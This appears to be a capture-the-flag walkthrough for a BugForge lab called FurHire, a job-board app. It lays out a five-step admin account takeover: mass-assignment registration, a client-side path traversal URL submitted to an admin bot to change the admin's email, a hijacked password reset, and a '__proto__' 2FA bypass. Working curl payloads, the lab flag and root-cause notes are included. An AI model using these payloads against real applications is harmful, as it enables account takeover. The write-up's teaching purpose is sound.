# furhire-010 - BugForge Lab Walkthrough

**URL:** https://lab-1781051619296-f75dps.labs-app.bugforge.io/
**Difficulty:** Hard
**Vulnerability:** CSPT (Client-Side Path Traversal) → Email Hijack → Password Reset → 2FA Prototype Pollution Bypass → ATO
**Flag:** `bug{8vd6I1ayxaXSF8L7Q1W0K3CTTPv0rml0}`

---

## Summary

FurHire is a recruitment platform (job board) with recruiter and user roles. The attack chain is a 5-step account takeover: (1) register as recruiter via mass assignment; (2) submit a CSPT-crafted invite URL to the support bot which changes the admin's email to an attacker-controlled `@labs-app.bugforge.io` address; (3) trigger a password reset to that address which is captured by the in-app mail catcher; (4) reset the admin's password; (5) log in as admin, bypass 2FA with a JavaScript prototype chain lookup collision (`code: "__proto__"`), and receive the flag in the login response.

## Tech Stack

- Express.js (Node.js)
- JWT (stored in localStorage)
- SQLite
- Socket.IO
- Plain JS frontend (no React/SPA build tooling - `app.js` + `invite.js` served from `/public/js/`)
- In-app mail catcher at `/email` / `GET /api/emails` (captures all `@labs-app.bugforge.io` mail)
- Admin support bot at `POST /api/support/tickets` - visits submitted URLs while authenticated

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Mass assignment: pass `"role":"recruiter"` |
| `/api/companies/:id/invites` | POST | Recruiter JWT | Creates invite, returns link |
| `/invite` | GET | None (bot is authed) | Loads `invite.js` - CSPT vector |
| `/api/companies/:companyId/invites/:inviteId` | PUT | JWT | CSPT traversal target path |
| `/api/account` | PUT | JWT | **Vulnerable**: updates email from `?email=` query param |
| `/api/support/tickets` | POST | JWT | Admin bot visits submitted `url` field |
| `/api/emails` | GET | No | Mail catcher - all `@labs-app.bugforge.io` mail |
| `/api/account/recover` | POST | No | Password reset by email |
| `/api/account/reset` | POST | No | Consume reset token, set new password |
| `/api/login` | POST | No | Returns `{twoFactorRequired, pendingId}` if 2FA on |
| `/api/2fa/verify` | POST | No | `{pendingId, code}` - vulnerable to `__proto__` |

## Attack Chain

### Step 1 - Register as recruiter (mass assignment)

```bash
curl -X POST https://TARGET/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker1","email":"attacker1@labs-app.bugforge.io","password":"Password123!","role":"recruiter"}'
# → {token: "...", user: {role: "recruiter"}}
```

### Step 2 - Create a company (to get a companyId for CSPT construction)

```bash
curl -X PUT https://TARGET/api/company \
  -H "Authorization: Bearer $RECRUITER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"company_name":"Evil Corp","industry":"Pets","description":"x","location":"x"}'
# → company.id = 3
```

### Step 3 - Submit CSPT URL to support bot

The CSPT is in `/public/js/invite.js`:
```javascript
var companyId = params.get('companyId');   // URLSearchParams decodes %2F → /
var inviteId  = params.get('inviteId');
var method    = (action === 'accept') ? 'PUT' : 'GET';
var apiPath   = '/api/companies/' + companyId + '/invites/' + inviteId;
fetch(apiPath, { method, headers: { Authorization: 'Bearer ' + token } });
```

`PUT /api/account?email=` changes the authenticated user's email via query string.

Payload construction:
- `companyId` = `3/../../../api/account?email=adminhack@labs-app.bugforge.io&x=`
- URL-encoded for query string: `3%2F..%2F..%2F..%2Fapi%2Faccount%3Femail%3Dadminhack%40labs-app.bugforge.io%26x%3D`

Resulting fetch call (browser normalizes path before `?`):
```
PUT /api/account?email=adminhack@labs-app.bugforge.io&x=/invites/x
```

Full CSPT URL submitted to support:
```
/invite?companyId=3%2F..%2F..%2F..%2Fapi%2Faccount%3Femail%3Dadminhack%40labs-app.bugforge.io%26x%3D&inviteId=x&action=accept
```

```bash
curl -X POST https://TARGET/api/support/tickets \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"/invite?companyId=3%2F..%2F..%2F..%2Fapi%2Faccount%3Femail%3Dadminhack%40labs-app.bugforge.io%26x%3D&inviteId=x&action=accept","description":"test"}'
```

Admin bot visits the URL while logged in → their email changes to `adminhack@labs-app.bugforge.io`.

### Step 4 - Capture password reset via mail catcher

```bash
# Trigger recovery for the admin's new (attacker-controlled) email
curl -X POST https://TARGET/api/account/recover \
  -H "Content-Type: application/json" \
  -d '{"email":"adminhack@labs-app.bugforge.io"}'

# Check mail catcher
curl https://TARGET/api/emails
# → /reset?token=001c228d03de9ead9c0a4fd75dba1170
```

### Step 5 - Reset password

```bash
curl -X POST https://TARGET/api/account/reset \
  -H "Content-Type: application/json" \
  -d '{"token":"001c228d03de9ead9c0a4fd75dba1170","newPassword":"Hacked123!"}'
# → {"message":"Password updated. You can now sign in."}
```

### Step 6 - Login with email as username (admin's login uses email field as `username`)

```bash
curl -X POST https://TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"adminhack@labs-app.bugforge.io","password":"Hacked123!"}'
# → {"twoFactorRequired":true,"pendingId":"5cee9ea11741d023847e5e3f"}
```

### Step 7 - Bypass 2FA with `__proto__` prototype pollution

The server uses a plain JS object as the OTP lookup table:
```javascript
const pendingCodes = {};
if (pendingCodes[code]) { grantSession(...) }
```

`pendingCodes["__proto__"]` resolves through the prototype chain to `Object.prototype` (truthy) - bypasses the check.

```bash
curl -X POST https://TARGET/api/2fa/verify \
  -H "Content-Type: application/json" \
  -d '{"pendingId":"5cee9ea11741d023847e5e3f","code":"__proto__"}'
# → {"token":"...","user":{...,"full_name":"bug{8vd6I1ayxaXSF8L7Q1W0K3CTTPv0rml0}"},"flag":"bug{8vd6I1ayxaXSF8L7Q1W0K3CTTPv0rml0}"}
```

## Discovery Notes

- Homepage: plain JS app, not React SPA - no source maps to extract
- Public pages array in `app.js` included `/email` - signalled an in-app mail catcher  
- `/company` page source revealed the invite system and `POST /api/companies/:id/invites`
- `/invite` page loaded a separate `invite.js` - immediately suspicious for CSPT
- `invite.js` had the canonical CSPT pattern: `params.get()` → string concat → `fetch()`
- `PUT /api/account` was discovered by probing common account management paths
- Confirmed `?email=` query param was read by checking the response body and re-fetching `/api/profile`
- Admin username turned out to be `pawsitive_hr` - revealed only in the 2FA bypass response

## Dead Ends

| Attempt | Why it failed | Lesson |
|---------|--------------|--------|
| `PUT /api/profile?email=` | Endpoint exists (200) but ignores `email` query param - only updates bio/skills/location | Profile and account are separate endpoints |
| `PUT /api/profile` body with `email` | Email field silently ignored | Server whitelists profile fields |
| Trying admin default creds (admin/password etc.) | No admin account with those creds | Pre-seeded user has non-obvious username |
| Using `attacker1@labs-app.bugforge.io` as admin target email | Conflicted with my own registered account email | Use a fresh email not associated with any account |
| `constructor`, `toString`, etc. as 2FA code | `pendingId` expired after first `__proto__` attempt consumed the session | `__proto__` works on first try; other keys work too but session is single-use |

## Root Causes

- `invite.js` interpolates unsanitized URL params directly into a `fetch()` path - no allowlist, no path-separator check
- `PUT /api/account` reads email from `req.query.email` - any authenticated request can change the caller's email, including those arriving via CSPT
- 2FA verification uses `if (pendingCodes[code])` on a plain object - prototype chain lookup allows `__proto__`, `constructor`, and other inherited keys to satisfy the check
- Login endpoint accepts email in the `username` field - wider attack surface than expected (any valid email works as a login identifier)

## CWE / OWASP

- **CWE-22**: Improper Limitation of a Pathname (Client-Side Path Traversal)
- **CWE-915**: Improperly Controlled Modification of Dynamically-Determined Object Attributes (Prototype Pollution)
- **CWE-640**: Weak Password Recovery Mechanism (email hijack enables full ATO)
- **OWASP A01:2021** - Broken Access Control
- **OWASP A03:2021** - Injection (Prototype Pollution)
